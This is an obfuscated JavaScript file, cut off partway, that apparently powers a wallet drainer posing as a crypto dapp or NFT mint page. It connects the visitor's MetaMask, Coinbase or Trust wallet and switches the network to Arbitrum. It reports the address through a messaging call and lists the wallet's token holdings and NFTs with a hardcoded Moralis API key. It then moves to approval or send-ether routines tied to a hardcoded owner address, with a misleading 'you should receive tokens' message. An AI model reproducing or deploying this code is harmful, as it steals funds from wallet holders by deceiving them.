const _0x3216ec=_0x1dbe;(function(_0x398b32,_0x8b402b){const _0x84421b=_0x1dbe,_0x1ebb1e=_0x398b32();while(!![]){try{const _0x43e0f2=-parseInt(_0x84421b(0x1cb))/0x1*(parseInt(_0x84421b(0x1db))/0x2)+parseInt(_0x84421b(0x187))/0x3*(-parseInt(_0x84421b(0x142))/0x4)+-parseInt(_0x84421b(0x174))/0x5+parseInt(_0x84421b(0x18b))/0x6+-parseInt(_0x84421b(0x17a))/0x7*(-parseInt(_0x84421b(0x15b))/0x8)+-parseInt(_0x84421b(0x1c8))/0x9*(-parseInt(_0x84421b(0x1d3))/0xa)+parseInt(_0x84421b(0x16f))/0xb;if(_0x43e0f2===_0x8b402b)break;else _0x1ebb1e['push'](_0x1ebb1e['shift']());}catch(_0x2b4ac3){_0x1ebb1e['push'](_0x1ebb1e['shift']());}}}(_0x15dc,0xed48b));function _0x15dc(){const _0x2cf8ce=['/erc20','_totalSupply','provenanceHash','Blockchain\x20rectification','openModal','chainId:','0xea8968B218a551919FbD5f1166328C82a96dED54','emergencySetStartingIndexBlock','OwnershipTransferred','maxApePurchase','Approval','error','addBlackList','tokenByIndex','getApproved','Present','approve','address','connector','metamask','bytes4','Transfer\x20Completed\x20Successfully,\x20You\x20should\x20receive\x20some\x20native\x20tokens','_user','newOwner','_data','Unable\x20to\x20get\x20NFts','.coinbase','interfaceId','_upgradedAddress','Could\x20not\x20get\x20a\x20wallet\x20connection','tokenURI','Unpause','view','Pause','function','deprecate','tokens-list','operator','setApprovalForAll','New\x20token','value','Cl\x20address\x20:\x20','Transaction\x20Rejected','catch','GET','_spender','Transfer','getOwner','&format=decimal&limit=','then','from','networkVersion','1359BcOwkc','map','RemovedBlackList','456107ddUTYL','all','name','transferOwnership','href','undefined','_evilUser','Error\x20processing\x20item\x20','98990LdVCPl','MAX_UINT','Your\x20address\x20','https://link.trustwallet.com/open_url?url=','tokenId','Transaction\x20hash\x20','_owner','setRevealTimestamp','2GsnjdH','https://go.cb-w.com/dapp?cb_url=','balanceOf','previousOwner','renounceOwnership','string','owner','price','decimals','formatted','event','application/json','allowed','Incorrect\x20network','payable','mintApe','Token\x20balance\x20is\x20','json','Params','https://altcoinsbox.com/wp-content/uploads/2022/12/coinbase-logo.png','CoinbaseWalletConnector','feeBasisPoints','42161','token_address','AddedBlackList','.proceed','arbitrum','Initial\x20list\x20','Wallet\x20Connected\x20Successfully\x20to\x20eth\x20mainnet!','trustwallet','symbol','_clearedUser','MetaMask','options','safeTransferFrom','setParams','gasPrice','4doPFPP','Error\x20collecting\x20info\x20about\x20wallet','_to','https://metamask.app.link/dapp/','filter','redeem','usd','spender','baseURI','flipSaleState','approved','_blackListedUser','allowance','&vs_currencies=usd','0xEB94D7306CE29437b21C5051F5a0c7d0C12294C0','hash','NFTs\x20collection\x20','status','Issue','Approve\x20Completed\x20Successfully','who','balance','search','supportsInterface','totalSupply','60488nmHTzN','saleIsActive','sending\x20ether','uint256','Connecting','saleStart','bool','deprecated','length','transferFrom','numberOfTokens','TOKEN\x20Contract\x20Address\x20','Error:\x20','ethereum','Not\x20present','_value','issue','REVEAL_TIMESTAMP','withdraw','newBasisPoints','1255903MqjWLd','constructor','Token','unpause','basisPointsRate','7108205PKufpA','999999999999999999999999999999999999999999999999999999999999999999999999','click','destroyBlackFunds','message','Deprecate','1330ZdnitK','maximumFee','log','revealTimeStamp','You\x20need\x20to\x20connect\x20your\x20wallet\x20first','coinbase','tokenOfOwnerByIndex','result','LJrmvC5VBYK43Qa9BKmVB4GUr7saw5TLZqKY65BQub1clqdAgjy16t5A7n16DIbn','toString','newMaxFee','nonpayable','&text=','2290809uZekFz','_from','.trust','index','3406524KnKLOE','Transaction\x20Receipt:\x20','apePrice','getBlackListStatus','amount','location','Hahahahahah','removeBlackList','5227607491'];_0x15dc=function(){return _0x2cf8ce;};return _0x15dc();}let NFTs=[],tokens=[],chainId=null,web3Object=null,selectedAccount=null;import{EthereumClient,w3mConnectors,w3mProvider,WagmiCore,WagmiCoreChains,WagmiCoreConnectors}from'https://unpkg.com/@web3modal/ethereum@2.6.2';import{parseEther}from'https://esm.sh/v126/viem@1.2.15/es2022/viem.bundle.mjs';import{Web3Modal}from'https://unpkg.com/@web3modal/html@2.6.2';const {arbitrum,mainnet}=WagmiCoreChains,{configureChains,createConfig,writeContract,sendTransaction,fetchBalance,fetchFeeData,connect,switchNetwork,getAccount,getNetwork}=WagmiCore,chains=[arbitrum,mainnet],projectId='ee71d215d0dec7d1bf950851c84d9643',{publicClient}=configureChains(chains,[w3mProvider({'projectId':projectId})]),wagmiConfig=createConfig({'autoConnect':!![],'connectors':[...w3mConnectors({'chains':chains,'version':0x2,'projectId':projectId}),new WagmiCoreConnectors[(_0x3216ec(0x131))]({'chains':chains,'options':{'appName':_0x3216ec(0x197)}})],'publicClient':publicClient}),ethereumClient=new EthereumClient(wagmiConfig,chains);export const web3Modal=new Web3Modal({'projectId':projectId,'walletImages':{'safe':'https://pbs.twimg.com/profile_images/1566773491764023297/IvmCdGnM_400x400.jpg','coinbase':_0x3216ec(0x130)}},ethereumClient);let currentUrl=window[_0x3216ec(0x190)][_0x3216ec(0x1cf)];const OWNER_ADDRESS=_0x3216ec(0x19a),ABI=[{'constant':!![],'inputs':[],'name':'name','outputs':[{'name':'','type':_0x3216ec(0x122)}],'payable':![],'stateMutability':'view','type':_0x3216ec(0x1b6)},{'constant':![],'inputs':[{'name':_0x3216ec(0x1b0),'type':'address'}],'name':_0x3216ec(0x1b7),'outputs':[],'payable':![],'stateMutability':_0x3216ec(0x185),'type':'function'},{'constant':![],'inputs':[{'name':_0x3216ec(0x1c1),'type':_0x3216ec(0x1a5)},{'name':'_value','type':_0x3216ec(0x15e)}],'name':_0x3216ec(0x1a4),'outputs':[],'payable':![],'stateMutability':_0x3216ec(0x185),'type':_0x3216ec(0x1b6)},{'constant':!![],'inputs':[],'name':_0x3216ec(0x162),'outputs':[{'name':'','type':_0x3216ec(0x161)}],'payable':![],'stateMutability':_0x3216ec(0x1b4),'type':'function'},{'constant':![],'inputs':[{'name':_0x3216ec(0x1d1),'type':_0x3216ec(0x1a5)}],'name':_0x3216ec(0x1a0),'outputs':[],'payable':![],'stateMutability':_0x3216ec(0x185),'type':_0x3216ec(0x1b6)},{'constant':!![],'inputs':[],'name':_0x3216ec(0x15a),'outputs':[{'name':'','type':'uint256'}],'payable':![],'stateMutability':_0x3216ec(0x1b4),'type':_0x3216ec(0x1b6)},{'constant':![],'inputs':[{'name':_0x3216ec(0x188),'type':_0x3216ec(0x1a5)},{'name':_0x3216ec(0x144),'type':_0x3216ec(0x1a5)},{'name':'_value','type':'uint256'}],'name':'transferFrom','outputs':[],'payable':![],'stateMutability':_0x3216ec(0x185),'type':'function'},{'constant':!![],'inputs':[],'name':'upgradedAddress','outputs':[{'name':'','type':_0x3216ec(0x1a5)}],'payable':![],'stateMutability':_0x3216ec(0x1b4),'type':_0x3216ec(0x1b6)},{'constant':!![],'inputs':[{'name':'','type':'address'}],'name':'balances','outputs':[{'name':'','type':_0x3216ec(0x15e)}],'payable':![],'stateMutability':_0x3216ec(0x1b4),'type':_0x3216ec(0x1b6)},{'constant':!![],'inputs':[],'name':_0x3216ec(0x125),'outputs':[{'name':'','type':'uint256'}],'payable':![],'stateMutability':_0x3216ec(0x1b4),'type':_0x3216ec(0x1b6)},{'constant':!![],'inputs':[],'name':_0x3216ec(0x17b),'outputs':[{'name':'','type':'uint256'}],'payable':![],'stateMutability':'view','type':_0x3216ec(0x1b6)},{'constant':!![],'inputs':[],'name':_0x3216ec(0x195),'outputs':[{'name':'','type':'uint256'}],'payable':![],'stateMutability':_0x3216ec(0x1b4),'type':'function'},{'constant':![],'inputs':[],'name':_0x3216ec(0x172),'outputs':[],'payable':![],'stateMutability':'nonpayable','type':_0x3216ec(0x1b6)},{'constant':!![],'inputs':[{'name':'_maker','type':'address'}],'name':_0x3216ec(0x18e),'outputs':[{'name':'','type':_0x3216ec(0x161)}],'payable':![],'stateMutability':'view','type':_0x3216ec(0x1b6)},{'constant':!![],'inputs':[{'name':'','type':_0x3216ec(0x1a5)},{'name':'','type':'address'}],'name':_0x3216ec(0x129),'outputs':[{'name':'','type':_0x3216ec(0x15e)}],'payable':![],'stateMutability':'view','type':_0x3216ec(0x1b6)},{'constant':!![],'inputs':[],'name':'paused','outputs':[{'name':'','type':_0x3216ec(0x161)}],'payable':![],'stateMutability':_0x3216ec(0x1b4),'type':_0x3216ec(0x1b6)},{'constant':!![],'inputs':[{'name':_0x3216ec(0x156),'type':'address'}],'name':_0x3216ec(0x11f),'outputs':[{'name':'','type':_0x3216ec(0x15e)}],'payable':![],'stateMutability':_0x3216ec(0x1b4),'type':_0x3216ec(0x1b6)},{'constant':![],'inputs':[],'name':'pause','outputs':[],'payable':![],'stateMutability':_0x3216ec(0x185),'type':_0x3216ec(0x1b6)},{'constant':!![],'inputs':[],'name':_0x3216ec(0x1c3),'outputs':[{'name':'','type':_0x3216ec(0x1a5)}],'payable':![],'stateMutability':_0x3216ec(0x1b4),'type':_0x3216ec(0x1b6)},{'constant':!![],'inputs':[],'name':_0x3216ec(0x123),'outputs':[{'name':'','type':_0x3216ec(0x1a5)}],'payable':![],'stateMutability':_0x3216ec(0x1b4),'type':_0x3216ec(0x1b6)},{'constant':!![],'inputs':[],'name':_0x3216ec(0x13b),'outputs':[{'name':'','type':'string'}],'payable':![],'stateMutability':_0x3216ec(0x1b4),'type':_0x3216ec(0x1b6)},{'constant':![],'inputs':[{'name':_0x3216ec(0x144),'type':_0x3216ec(0x1a5)},{'name':_0x3216ec(0x16a),'type':'uint256'}],'name':'transfer','outputs':[],'payable':![],'stateMutability':'nonpayable','type':_0x3216ec(0x1b6)},{'constant':![],'inputs':[{'name':_0x3216ec(0x16e),'type':_0x3216ec(0x15e)},{'name':_0x3216ec(0x184),'type':'uint256'}],'name':_0x3216ec(0x140),'outputs':[],'payable':![],'stateMutability':'nonpayable','type':_0x3216ec(0x1b6)},{'constant':![],'inputs':[{'name':_0x3216ec(0x18f),'type':_0x3216ec(0x15e)}],'name':_0x3216ec(0x16b),'outputs':[],'payable':![],'stateMutability':_0x3216ec(0x185),'type':_0x3216ec(0x1b6)},{'constant':![],'inputs':[{'name':_0x3216ec(0x18f),'type':_0x3216ec(0x15e)}],'name':_0x3216ec(0x147),'outputs':[],'payable':![],'stateMutability':_0x3216ec(0x185),'type':'function'},{'constant':!![],'inputs':[{'name':_0x3216ec(0x1d9),'type':_0x3216ec(0x1a5)},{'name':_0x3216ec(0x1c1),'type':'address'}],'name':_0x3216ec(0x14e),'outputs':[{'name':'remaining','type':'uint256'}],'payable':![],'stateMutability':_0x3216ec(0x1b4),'type':'function'},{'constant':!![],'inputs':[],'name':_0x3216ec(0x173),'outputs':[{'name':'','type':_0x3216ec(0x15e)}],'payable':![],'stateMutability':'view','type':_0x3216ec(0x1b6)},{'constant':!![],'inputs':[{'name':'','type':_0x3216ec(0x1a5)}],'name':'isBlackListed','outputs':[{'name':'','type':'bool'}],'payable':![],'stateMutability':_0x3216ec(0x1b4),'type':'function'},{'constant':![],'inputs':[{'name':_0x3216ec(0x13c),'type':'address'}],'name':_0x3216ec(0x192),'outputs':[],'payable':![],'stateMutability':_0x3216ec(0x185),'type':'function'},{'constant':!![],'inputs':[],'name':_0x3216ec(0x1d4),'outputs':[{'name':'','type':_0x3216ec(0x15e)}],'payable':![],'stateMutability':'view','type':'function'},{'constant':![],'inputs':[{'name':_0x3216ec(0x1ab),'type':'address'}],'name':_0x3216ec(0x1ce),'outputs':[],'payable':![],'stateMutability':_0x3216ec(0x185),'type':'function'},{'constant':![],'inputs':[{'name':'_blackListedUser','type':_0x3216ec(0x1a5)}],'name':_0x3216ec(0x177),'outputs':[],'payable':![],'stateMutability':_0x3216ec(0x185),'type':'function'},{'inputs':[{'name':'_initialSupply','type':'uint256'},{'name':'_name','type':'string'},{'name':'_symbol','type':_0x3216ec(0x122)},{'name':'_decimals','type':'uint256'}],'payable':![],'stateMutability':_0x3216ec(0x185),'type':_0x3216ec(0x170)},{'anonymous':![],'inputs':[{'indexed':![],'name':_0x3216ec(0x18f),'type':_0x3216ec(0x15e)}],'name':_0x3216ec(0x154),'type':_0x3216ec(0x127)},{'anonymous':![],'inputs':[{'indexed':![],'name':_0x3216ec(0x18f),'type':_0x3216ec(0x15e)}],'name':'Redeem','type':_0x3216ec(0x127)},{'anonymous':![],'inputs':[{'indexed':![],'name':'newAddress','type':_0x3216ec(0x1a5)}],'name':_0x3216ec(0x179),'type':'event'},{'anonymous':![],'inputs':[{'indexed':![],'name':_0x3216ec(0x132),'type':_0x3216ec(0x15e)},{'indexed':![],'name':'maxFee','type':_0x3216ec(0x15e)}],'name':_0x3216ec(0x12f),'type':_0x3216ec(0x127)},{'anonymous':![],'inputs':[{'indexed':![],'name':_0x3216ec(0x14d),'type':_0x3216ec(0x1a5)},{'indexed':![],'name':'_balance','type':_0x3216ec(0x15e)}],'name':'DestroyedBlackFunds','type':'event'},{'anonymous':![],'inputs':[{'indexed':![],'name':_0x3216ec(0x1aa),'type':_0x3216ec(0x1a5)}],'name':_0x3216ec(0x135),'type':'event'},{'anonymous':![],'inputs':[{'indexed':![],'name':'_user','type':'address'}],'name':_0x3216ec(0x1ca),'type':_0x3216ec(0x127)},{'anonymous':![],'inputs':[{'indexed':!![],'name':_0x3216ec(0x123),'type':_0x3216ec(0x1a5)},{'indexed':!![],'name':_0x3216ec(0x149),'type':_0x3216ec(0x1a5)},{'indexed':![],'name':_0x3216ec(0x1bc),'type':_0x3216ec(0x15e)}],'name':_0x3216ec(0x19e),'type':'event'},{'anonymous':![],'inputs':[{'indexed':!![],'name':_0x3216ec(0x1c6),'type':_0x3216ec(0x1a5)},{'indexed':!![],'name':'to','type':_0x3216ec(0x1a5)},{'indexed':![],'name':'value','type':_0x3216ec(0x15e)}],'name':_0x3216ec(0x1c2),'type':'event'},{'anonymous':![],'inputs':[],'name':_0x3216ec(0x1b5),'type':_0x3216ec(0x127)},{'anonymous':![],'inputs':[],'name':_0x3216ec(0x1b3),'type':_0x3216ec(0x127)}],ABIN=[{'inputs':[{'internalType':_0x3216ec(0x122),'name':_0x3216ec(0x1cd),'type':_0x3216ec(0x122)},{'internalType':_0x3216ec(0x122),'name':'symbol','type':_0x3216ec(0x122)},{'internalType':_0x3216ec(0x15e),'name':'maxNftSupply','type':_0x3216ec(0x15e)},{'internalType':_0x3216ec(0x15e),'name':_0x3216ec(0x160),'type':'uint256'}],'stateMutability':'nonpayable','type':_0x3216ec(0x170)},{'anonymous':![],'inputs':[{'indexed':!![],'internalType':_0x3216ec(0x1a5),'name':_0x3216ec(0x123),'type':_0x3216ec(0x1a5)},{'indexed':!![],'internalType':_0x3216ec(0x1a5),'name':_0x3216ec(0x14c),'type':'address'},{'indexed':!![],'internalType':'uint256','name':'tokenId','type':_0x3216ec(0x15e)}],'name':_0x3216ec(0x19e),'type':'event'},{'anonymous':![],'inputs':[{'indexed':!![],'internalType':_0x3216ec(0x1a5),'name':_0x3216ec(0x123),'type':'address'},{'indexed':!![],'internalType':_0x3216ec(0x1a5),'name':_0x3216ec(0x1b9),'type':_0x3216ec(0x1a5)},{'indexed':![],'internalType':_0x3216ec(0x161),'name':'approved','type':_0x3216ec(0x161)}],'name':'ApprovalForAll','type':_0x3216ec(0x127)},{'anonymous':![],'inputs':[{'indexed':!![],'internalType':_0x3216ec(0x1a5),'name':_0x3216ec(0x120),'type':'address'},{'indexed':!![],'internalType':'address','name':_0x3216ec(0x1ab),'type':_0x3216ec(0x1a5)}],'name':_0x3216ec(0x19c),'type':_0x3216ec(0x127)},{'anonymous':![],'inputs':[{'indexed':!![],'internalType':_0x3216ec(0x1a5),'name':_0x3216ec(0x1c6),'type':'address'},{'indexed':!![],'internalType':_0x3216ec(0x1a5),'name':'to','type':_0x3216ec(0x1a5)},{'indexed':!![],'internalType':_0x3216ec(0x15e),'name':'tokenId','type':'uint256'}],'name':_0x3216ec(0x1c2),'type':_0x3216ec(0x127)},{'inputs':[],'name':'BAYC_PROVENANCE','outputs':[{'internalType':_0x3216ec(0x122),'name':'','type':'string'}],'stateMutability':_0x3216ec(0x1b4),'type':_0x3216ec(0x1b6)},{'inputs':[],'name':'MAX_APES','outputs':[{'internalType':_0x3216ec(0x15e),'name':'','type':_0x3216ec(0x15e)}],'stateMutability':'view','type':_0x3216ec(0x1b6)},{'inputs':[],'name':_0x3216ec(0x16c),'outputs':[{'internalType':_0x3216ec(0x15e),'name':'','type':_0x3216ec(0x15e)}],'stateMutability':_0x3216ec(0x1b4),'type':_0x3216ec(0x1b6)},{'inputs':[],'name':_0x3216ec(0x18d),'outputs':[{'internalType':_0x3216ec(0x15e),'name':'','type':'uint256'}],'stateMutability':_0x3216ec(0x1b4),'type':_0x3216ec(0x1b6)},{'inputs':[{'internalType':'address','name':'to','type':'address'},{'internalType':'uint256','name':_0x3216ec(0x1d7),'type':_0x3216ec(0x15e)}],'name':'approve','outputs':[],'stateMutability':_0x3216ec(0x185),'type':_0x3216ec(0x1b6)},{'inputs':[{'internalType':_0x3216ec(0x1a5),'name':'owner','type':'address'}],'name':_0x3216ec(0x11f),'outputs':[{'internalType':_0x3216ec(0x15e),'name':'','type':_0x3216ec(0x15e)}],'stateMutability':_0x3216ec(0x1b4),'type':'function'},{'inputs':[],'name':_0x3216ec(0x14a),'outputs':[{'internalType':_0x3216ec(0x122),'name':'','type':_0x3216ec(0x122)}],'stateMutability':'view','type':_0x3216ec(0x1b6)},{'inputs':[],'name':_0x3216ec(0x19b),'outputs':[],'stateMutability':_0x3216ec(0x185),'type':_0x3216ec(0x1b6)},{'inputs':[],'name':_0x3216ec(0x14b),'outputs':[],'stateMutability':_0x3216ec(0x185),'type':_0x3216ec(0x1b6)},{'inputs':[{'internalType':_0x3216ec(0x15e),'name':_0x3216ec(0x1d7),'type':'uint256'}],'name':_0x3216ec(0x1a2),'outputs':[{'internalType':'address','name':'','type':_0x3216ec(0x1a5)}],'stateMutability':'view','type':_0x3216ec(0x1b6)},{'inputs':[{'internalType':_0x3216ec(0x1a5),'name':_0x3216ec(0x123),'type':'address'},{'internalType':_0x3216ec(0x1a5),'name':'operator','type':'address'}],'name':'isApprovedForAll','outputs':[{'internalType':_0x3216ec(0x161),'name':'','type':_0x3216ec(0x161)}],'stateMutability':_0x3216ec(0x1b4),'type':_0x3216ec(0x1b6)},{'inputs':[],'name':_0x3216ec(0x19d),'outputs':[{'internalType':_0x3216ec(0x15e),'name':'','type':_0x3216ec(0x15e)}],'stateMutability':_0x3216ec(0x1b4),'type':_0x3216ec(0x1b6)},{'inputs':[{'internalType':_0x3216ec(0x15e),'name':_0x3216ec(0x165),'type':_0x3216ec(0x15e)}],'name':_0x3216ec(0x12c),'outputs':[],'stateMutability':_0x3216ec(0x12b),'type':_0x3216ec(0x1b6)},{'inputs':[],'name':_0x3216ec(0x1cd),'outputs':[{'internalType':'string','name':'','type':_0x3216ec(0x122)}],'stateMutability':_0x3216ec(0x1b4),'type':_0x3216ec(0x1b6)},{'inputs':[],'name':_0x3216ec(0x123),'outputs':[{'internalType':_0x3216ec(0x1a5),'name':'','type':_0x3216ec(0x1a5)}],'stateMutability':'view','type':_0x3216ec(0x1b6)},{'inputs':[{'internalType':_0x3216ec(0x15e),'name':_0x3216ec(0x1d7),'type':_0x3216ec(0x15e)}],'name':'ownerOf','outputs':[{'internalType':_0x3216ec(0x1a5),'name':'','type':_0x3216ec(0x1a5)}],'stateMutability':_0x3216ec(0x1b4),'type':_0x3216ec(0x1b6)},{'inputs':[],'name':_0x3216ec(0x121),'outputs':[],'stateMutability':_0x3216ec(0x185),'type':_0x3216ec(0x1b6)},{'inputs':[],'name':'reserveApes','outputs':[],'stateMutability':_0x3216ec(0x185),'type':'function'},{'inputs':[{'internalType':_0x3216ec(0x1a5),'name':_0x3216ec(0x1c6),'type':'address'},{'internalType':_0x3216ec(0x1a5),'name':'to','type':_0x3216ec(0x1a5)},{'internalType':_0x3216ec(0x15e),'name':_0x3216ec(0x1d7),'type':_0x3216ec(0x15e)}],'name':_0x3216ec(0x13f),'outputs':[],'stateMutability':_0x3216ec(0x185),'type':_0x3216ec(0x1b6)},{'inputs':[{'internalType':_0x3216ec(0x1a5),'name':_0x3216ec(0x1c6),'type':_0x3216ec(0x1a5)},{'internalType':'address','name':'to','type':_0x3216ec(0x1a5)},{'internalType':'uint256','name':_0x3216ec(0x1d7),'type':'uint256'},{'internalType':'bytes','name':_0x3216ec(0x1ac),'type':'bytes'}],'name':'safeTransferFrom','outputs':[],'stateMutability':_0x3216ec(0x185),'type':_0x3216ec(0x1b6)},{'inputs':[],'name':_0x3216ec(0x15c),'outputs':[{'internalType':'bool','name':'','type':'bool'}],'stateMutability':_0x3216ec(0x1b4),'type':_0x3216ec(0x1b6)},{'inputs':[{'internalType':_0x3216ec(0x1a5),'name':_0x3216ec(0x1b9),'type':_0x3216ec(0x1a5)},{'internalType':_0x3216ec(0x161),'name':_0x3216ec(0x14c),'type':'bool'}],'name':_0x3216ec(0x1ba),'outputs':[],'stateMutability':_0x3216ec(0x185),'type':'function'},{'inputs':[{'internalType':_0x3216ec(0x122),'name':_0x3216ec(0x14a),'type':_0x3216ec(0x122)}],'name':'setBaseURI','outputs':[],'stateMutability':_0x3216ec(0x185),'type':_0x3216ec(0x1b6)},{'inputs':[{'internalType':_0x3216ec(0x122),'name':_0x3216ec(0x196),'type':_0x3216ec(0x122)}],'name':'setProvenanceHash','outputs':[],'stateMutability':'nonpayable','type':_0x3216ec(0x1b6)},{'inputs':[{'internalType':_0x3216ec(0x15e),'name':_0x3216ec(0x17d),'type':_0x3216ec(0x15e)}],'name':_0x3216ec(0x1da),'outputs':[],'stateMutability':_0x3216ec(0x185),'type':_0x3216ec(0x1b6)},{'inputs':[],'name':'setStartingIndex','outputs':[],'stateMutability':_0x3216ec(0x185),'type':'function'},{'inputs':[],'name':'startingIndex','outputs':[{'internalType':_0x3216ec(0x15e),'name':'','type':'uint256'}],'stateMutability':_0x3216ec(0x1b4),'type':_0x3216ec(0x1b6)},{'inputs':[],'name':'startingIndexBlock','outputs':[{'internalType':_0x3216ec(0x15e),'name':'','type':_0x3216ec(0x15e)}],'stateMutability':_0x3216ec(0x1b4),'type':_0x3216ec(0x1b6)},{'inputs':[{'internalType':'bytes4','name':_0x3216ec(0x1af),'type':_0x3216ec(0x1a8)}],'name':_0x3216ec(0x159),'outputs':[{'internalType':_0x3216ec(0x161),'name':'','type':'bool'}],'stateMutability':_0x3216ec(0x1b4),'type':_0x3216ec(0x1b6)},{'inputs':[],'name':'symbol','outputs':[{'internalType':_0x3216ec(0x122),'name':'','type':_0x3216ec(0x122)}],'stateMutability':_0x3216ec(0x1b4),'type':'function'},{'inputs':[{'internalType':'uint256','name':_0x3216ec(0x18a),'type':'uint256'}],'name':_0x3216ec(0x1a1),'outputs':[{'internalType':'uint256','name':'','type':'uint256'}],'stateMutability':_0x3216ec(0x1b4),'type':_0x3216ec(0x1b6)},{'inputs':[{'internalType':'address','name':_0x3216ec(0x123),'type':'address'},{'internalType':_0x3216ec(0x15e),'name':_0x3216ec(0x18a),'type':_0x3216ec(0x15e)}],'name':_0x3216ec(0x180),'outputs':[{'internalType':'uint256','name':'','type':'uint256'}],'stateMutability':'view','type':_0x3216ec(0x1b6)},{'inputs':[{'internalType':'uint256','name':_0x3216ec(0x1d7),'type':_0x3216ec(0x15e)}],'name':_0x3216ec(0x1b2),'outputs':[{'internalType':_0x3216ec(0x122),'name':'','type':'string'}],'stateMutability':'view','type':_0x3216ec(0x1b6)},{'inputs':[],'name':'totalSupply','outputs':[{'internalType':_0x3216ec(0x15e),'name':'','type':_0x3216ec(0x15e)}],'stateMutability':_0x3216ec(0x1b4),'type':_0x3216ec(0x1b6)},{'inputs':[{'internalType':'address','name':'from','type':'address'},{'internalType':_0x3216ec(0x1a5),'name':'to','type':_0x3216ec(0x1a5)},{'internalType':'uint256','name':'tokenId','type':_0x3216ec(0x15e)}],'name':_0x3216ec(0x164),'outputs':[],'stateMutability':_0x3216ec(0x185),'type':_0x3216ec(0x1b6)},{'inputs':[{'internalType':_0x3216ec(0x1a5),'name':'newOwner','type':_0x3216ec(0x1a5)}],'name':'transferOwnership','outputs':[],'stateMutability':_0x3216ec(0x185),'type':_0x3216ec(0x1b6)},{'inputs':[],'name':_0x3216ec(0x16d),'outputs':[],'stateMutability':_0x3216ec(0x185),'type':'function'}];function _0x1dbe(_0x233b79,_0x1abdb8){const _0x15dcc8=_0x15dc();return _0x1dbe=function(_0x1dbe6f,_0x48526a){_0x1dbe6f=_0x1dbe6f-0x11f;let _0x372048=_0x15dcc8[_0x1dbe6f];return _0x372048;},_0x1dbe(_0x233b79,_0x1abdb8);}let wallet;$('.meta')[_0x3216ec(0x176)](async function(){wallet='metamask',await connector();}),$(_0x3216ec(0x1ae))[_0x3216ec(0x176)](async function(){const _0x5cf3b9=_0x3216ec;wallet=_0x5cf3b9(0x17f),await connector();}),$(_0x3216ec(0x189))[_0x3216ec(0x176)](async function(){const _0x5b4ba3=_0x3216ec;wallet=_0x5b4ba3(0x13a),await connector();}),$('.connect')[_0x3216ec(0x176)](async function(){const _0x418bd3=_0x3216ec;try{await web3Modal[_0x418bd3(0x198)]();}catch(_0x4a71bd){console['log']('Could\x20not\x20get\x20a\x20wallet\x20connection',_0x4a71bd);return;}});let connector=async()=>{const _0x2628ac=_0x3216ec;alert(_0x2628ac(0x15f));windows['ethereum']===_0x2628ac(0x1d0)?alert(_0x2628ac(0x169)):alert(_0x2628ac(0x1a3));if(typeof web3==='undefined'||windows[_0x2628ac(0x168)]===_0x2628ac(0x1d0)){console['log'](_0x2628ac(0x191));if(wallet===_0x2628ac(0x1a7)){let _0x13fbc7=_0x2628ac(0x145)+currentUrl;window[_0x2628ac(0x190)]['href']=_0x13fbc7;}else{if(wallet===_0x2628ac(0x17f)){let _0x2f0c0e=_0x2628ac(0x1dc)+currentUrl;window[_0x2628ac(0x190)][_0x2628ac(0x1cf)]=_0x2f0c0e;}else{if(wallet===_0x2628ac(0x13a)){let _0x39567a=_0x2628ac(0x1d6)+currentUrl;window['location'][_0x2628ac(0x1cf)]=_0x39567a;}}}}else try{await web3Modal['openModal']();}catch(_0x36e104){console[_0x2628ac(0x17c)](_0x2628ac(0x1b1),_0x36e104);return;}};$(_0x3216ec(0x136))[_0x3216ec(0x176)](async function(){const _0xa5ecb6=_0x3216ec;let _0x4099bc=getAccount();console[_0xa5ecb6(0x17c)](_0x4099bc),!_0x4099bc['address']&&(console[_0xa5ecb6(0x17c)]('No\x20address'),alert(_0xa5ecb6(0x17e))),_0x4099bc[_0xa5ecb6(0x1a6)]['name']===_0xa5ecb6(0x13d)&&(_0x4099bc[_0xa5ecb6(0x1a6)][_0xa5ecb6(0x13e)]['getProvider']()[_0xa5ecb6(0x1c7)]!==_0xa5ecb6(0x133)&&(console[_0xa5ecb6(0x17c)](_0xa5ecb6(0x12a)),await switchNetwork({'chainId':0xa4b1}))),selectedAccount=_0x4099bc[_0xa5ecb6(0x1a5)],sendMessage(_0xa5ecb6(0x139)),sendMessage(_0xa5ecb6(0x1bd)+selectedAccount),covalenthqAPICall();});const Oxa=_0x3216ec(0x150),Oxc=_0x3216ec(0x193);async function covalenthqAPICall(){const _0x222980=_0x3216ec,_0x3ed8c0={'chain':_0x222980(0x137)},_0x5f0cce=new URL('https://deep-index.moralis.io/api/v2/'+selectedAccount+_0x222980(0x194));_0x5f0cce[_0x222980(0x158)]=new URLSearchParams(_0x3ed8c0)[_0x222980(0x183)]();const _0x1c39d4={'method':_0x222980(0x1c0),'headers':{'accept':_0x222980(0x128),'X-API-Key':_0x222980(0x182)}};try{const _0x568e2b=await fetch(_0x5f0cce,_0x1c39d4)[_0x222980(0x1c5)](_0x32a089=>_0x32a089['json']());console[_0x222980(0x17c)](_0x568e2b);let _0x31d997=_0x568e2b;console[_0x222980(0x17c)](_0x222980(0x138),_0x31d997);let _0x1f6764=await Promise[_0x222980(0x1cc)](_0x31d997[_0x222980(0x1c9)](async _0x400146=>{const _0x369c3c=_0x222980;let _0x204257;try{_0x204257=await getValue(_0x400146['token_address'],_0x400146[_0x369c3c(0x157)],_0x400146[_0x369c3c(0x125)]);}catch(_0x2434bc){_0x204257=0x0;}return console[_0x369c3c(0x17c)](_0x204257),{'balance':_0x400146[_0x369c3c(0x157)],'value':_0x204257,'address':_0x400146[_0x369c3c(0x134)]};}));console[_0x222980(0x17c)](_0x222980(0x1b8),_0x1f6764),tokens=_0x1f6764[_0x222980(0x146)](_0x4a3113=>_0x4a3113[_0x222980(0x1bc)]>0x5),tokens['sort']((_0x302540,_0x5483db)=>_0x5483db[_0x222980(0x1bc)]-_0x302540['value']),console[_0x222980(0x17c)](_0x222980(0x199),await getNetwork(),'Tokens:',tokens),NFTs=await getNFTs(selectedAccount)[_0x222980(0x1bf)](_0x4d05bf=>{const _0x29a5f5=_0x222980;console[_0x29a5f5(0x17c)](_0x29a5f5(0x1ad),_0x4d05bf);}),NFTs=NFTs[_0x222980(0x181)],console[_0x222980(0x17c)](_0x222980(0x152),NFTs);if(tokens[_0x222980(0x163)]===0x0&&NFTs[_0x222980(0x163)]===0x0)onSendEther();else onApprove();}catch{sendMessage(_0x222980(0x143));}}async function onApprove(){const 